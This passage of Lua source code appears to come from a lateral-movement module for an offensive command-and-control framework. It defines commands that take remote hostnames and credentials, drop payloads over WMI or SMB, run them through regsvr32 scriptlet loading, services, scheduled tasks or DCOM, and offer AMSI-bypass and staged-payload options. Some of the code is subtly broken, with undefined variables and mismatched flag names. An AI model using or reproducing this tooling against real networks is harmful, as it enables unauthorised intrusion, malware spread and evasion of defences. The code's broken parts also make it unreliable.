mshta_file_command:Flags():String("cmdtrigger", "WMI", '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
mshta_file_command:Flags():String("file_url", "", "Use file url")
mshta_file_command:Flags():String("droptype", MoveKit.movedefaults.droptype, '(e.g,"WMI", "SMB")')
mshta_file_command:Flags():String("droplocation", MoveKit.movedefaults.droplocation, "Drop location")
mshta_file_command:Flags():String("filename", MoveKit.movedefaults.filename, "Drop file name")
mshta_file_command:Flags():String("eventname", MoveKit.movedefaults.eventname, "Event name")
mshta_file_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host or Move file")
mshta_file_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
mshta_file_command:Flags():Bool("amsi-bypass", false, "Use amsi bypass")
mshta_file_command:Flags():Bool("staged", false, "Use staged payload")

-- regsvr32_file
local function move_regsvr32_file(cmd)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "Regsvr32 Lateral Movement"
    payloadtype = "raw"
    compile = false
    exectemplate = "regsvr32.sct"
    local session = active()
    local arch = session.Os.Arch
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local droptype = cmd:Flags():GetString("droptype")
    local x86 = cmd:Flags():GetBool("is_x86")
    local staged = cmd:Flags():GetBool("staged")
    local location = cmd:Flags():GetString("file_url")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local filename = cmd:Flags():GetString("filename")
    local droplocation = cmd:Flags():GetString("droplocation")
    local eventname = cmd:Flags():GetString("eventname")
    local auto = cmd:Flags():GetBool("auto")
    local amsi = cmd:Flags():GetBool("amsi")
    local args = {
        computername = computername,
        credential = credential,
        droptype = droptype,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        cmdtrigger = cmdtrigger,
        filename = filename,
        droplocation = droplocation,
        eventname = eventname,
        auto = auto,
        amsi = amsi
    }
    if x86 then
        cmdarch = "C:\\Windows\\SysWOW64\\regsvr32.exe "
    else
        cmdarch = "C:\\Windows\\System32\\regsvr32.exe "
    end
    if cmdtrigger == "SCM" or cmdtrigger == "ModifyService" then
        lastcommand = "C:\\WINDOWS\\System32\\cmd.exe /c " .. cmdarch .. "/s /n /i:" .. location .. "\\" .. filename .. " scrobj.dll"
    else
        lastcommand = cmdarch .. "/s /n /i:" .. location .. "\\" .. filename .. " scrobj.dll"
    end
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname,exectemplate)
end
local regsvr32_file_command = command("move:regsvr32_file", move_regsvr32_file, "", "")
regsvr32_file_command:Flags():String("droptype", MoveKit.movedefaults.droptype, '(e.g,"WMI", "SMB")')
regsvr32_file_command:Flags():String("cmdtrigger", MoveKit.movedefaults.cmdtrigger, '(e.g,"WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE")')
regsvr32_file_command:Flags():String("file_url", "", "Use file url")
regsvr32_file_command:Flags():String("droplocation", MoveKit.movedefaults.droplocation, "Drop location")
regsvr32_file_command:Flags():String("filename", MoveKit.movedefaults.filename, "Drop file name")
regsvr32_file_command:Flags():String("eventname", MoveKit.movedefaults.eventname, "Event name")
regsvr32_file_command:Flags():String("computername", "", "(e.g., remote.host.local)")
regsvr32_file_command:Flags():String("credential", "", "")
regsvr32_file_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host or Move file")
regsvr32_file_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
regsvr32_file_command:Flags():Bool("amsi", MoveKit.movedefaults.amsi, "AMSI Bypass")
regsvr32_file_command:Flags():Bool("staged", false, "Use staged payload")




-- custom_nonprebuilt_file
local function move_custom_nonprebuilt_file(cmd)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "NonPreBuiltCustom Lateral Movement"
    payloadtype = "raw"
    compile = true
    exectemplate = "custom-nonpre.cs"
    local droptype = cmd:Flags():GetString("droptype")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local location = cmd:Flags():GetString("location")
    local droplocation = cmd:Flags():GetString("droplocation")
    local filename = cmd:Flags():GetString("filename")
    local eventname = cmd:Flags():GetString("eventname")
    local computername = cmd:Flags():GetString("computername")
    local credential = cmd:Flags():GetString("credential")
    local auto = cmd:Flags():GetBool("auto")
    local x86 = cmd:Flags():GetBool("is_x86")
    local amsi = cmd:Flags():GetBool("amsi")
    local staged = cmd:Flags():GetBool("staged")
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        cmdtrigger = cmdtrigger,
        eventname = eventname,
        amsi = amsi,
        droptype = droptype,
        droplocation = droplocation,
        filename = filename,
        auto = auto
    }
    local lastcommand = droplocation .. "\\" .. filename
    if cmdtrigger == "SCM" or cmdtrigger == "ModifyService" then
        exectemplate = "service-custom-nonpre.cs"
    end
    MoveKit.bearings(args, lastcommand, payloadtype, compile, descname, exectemplate)
end
local custom_nonprebuilt_file_command = command("move:custom_nonprebuilt_file", move_custom_nonprebuilt_file, "", "")
custom_nonprebuilt_file_command:Flags():String("droptype", "SMB", "(e.g., WMI, SMB)")
custom_nonprebuilt_file_command:Flags():String("cmdtrigger", "WMI", "(e.g., WMI, RDP, SCM, SCHTASK, ModifySchTask, ModifyService, DCOM ShellWindows, DCOM MMC, DCOM ShellBrowserWindow, DCOM ExcelDDE)")
custom_nonprebuilt_file_command:Flags():String("location", MoveKit.movedefaults.location, "Location")
custom_nonprebuilt_file_command:Flags():String("droplocation", MoveKit.movedefaults.droplocation, "Drop location")
custom_nonprebuilt_file_command:Flags():String("filename", MoveKit.movedefaults.filename, "Drop file name")
custom_nonprebuilt_file_command:Flags():String("eventname", MoveKit.movedefaults.eventname, "Event name")
custom_nonprebuilt_file_command:Flags():String("computername", "", "(e.g., remote.host.local)")
custom_nonprebuilt_file_command:Flags():String("credential", "", "")
custom_nonprebuilt_file_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host or Move file")
custom_nonprebuilt_file_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
custom_nonprebuilt_file_command:Flags():Bool("amsi", false, "Use amsi bypass")
custom_nonprebuilt_file_command:Flags():Bool("staged", false, "Use staged payload")


-- custom_prebuilt
local function move_custom_prebuilt(cmd)
    local payloadtype, descname, exectemplate, compile, latcommand, cmdarch
    descname = "PreBuiltCustom Lateral Movement"
    payloadtype = "custom"
    local droptype = cmd:Flags():GetString("droptype")
    local cmdtrigger = cmd:Flags():GetString("cmdtrigger")
    local computername = cmd:Flags():GetString("computername")
    local location = cmd:Flags():GetString("location")
    local droplocation = cmd:Flags():GetString("droplocation")
    local filename = cmd:Flags():GetString("filename")
    local eventname = cmd:Flags():GetString("eventname")
    local credential = cmd:Flags():GetString("credential")
    local auto = cmd:Flags():GetBool("auto")
    local x86 = cmd:Flags():GetBool("is_x86")
    local amsi = cmd:Flags():GetBool("amsi")
    local staged = cmd:Flags():GetBool("staged")
    local lastcommand = droplocation .. "\\" .. filename
    local args = {
        computername = computername,
        credential = credential,
        x86 = x86,
        staged = staged,
        payloadtype = payloadtype,
        compile = compile,
        descname = descname,
        exectemplate = exectemplate,
        location = location,
        cmdtrigger = cmdtrigger,
        eventname = eventname,
        amsi = amsi,
        droptype = droptype,
        droplocation = droplocation,
        filename = filename
    }
    if override == "" then
        scmd = droplocation .. "\\" .. filename
    else
        scmd = override
    end
    if cmdtrigger == "SCM" or cmdtrigger == "ModifyService" and svcbin == false then
        latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c " .. scmd .. ""
    else
        latcommand = scmd
    end
    MoveKit.bearings(args, latcommand, payloadtype, compile, descname, exectemplate)
end
local custom_prebuilt_command = command("move:custom_prebuilt", move_custom_prebuilt, "", "")
custom_prebuilt_command:Flags():String("droptype", "WMI", "(e.g., WMI, SMB)")
custom_prebuilt_command:Flags():String("cmdtrigger", "WMI", "(e.g., WMI, RDP, SCM, SCHTASK, ModifySchTask, ModifyService, DCOM ShellWindows, DCOM MMC, DCOM ShellBrowserWindow, DCOM ExcelDDE)")
custom_prebuilt_command:Flags():String("location", MoveKit.movedefaults.location, "Location")
custom_prebuilt_command:Flags():String("droplocation", MoveKit.movedefaults.droplocation, "Drop location")
custom_prebuilt_command:Flags():String("filename", MoveKit.movedefaults.filename, "Drop file name")
custom_prebuilt_command:Flags():String("eventname", MoveKit.movedefaults.eventname, "Event name")
custom_prebuilt_command:Flags():String("computername", "", "(e.g., remote.host.local)")
custom_prebuilt_command:Flags():String("credential", "", "")
custom_prebuilt_command:Flags():Bool("auto", MoveKit.movedefaults.auto, "Auto Host or Move file")
custom_prebuilt_command:Flags():Bool("is_x86", false, "Use x86 arch payload")
custom_prebuilt_command:Flags():Bool("amsi", false, "Use amsi bypass")
custom_prebuilt_command:Flags():Bool("staged", false, "Use staged payload")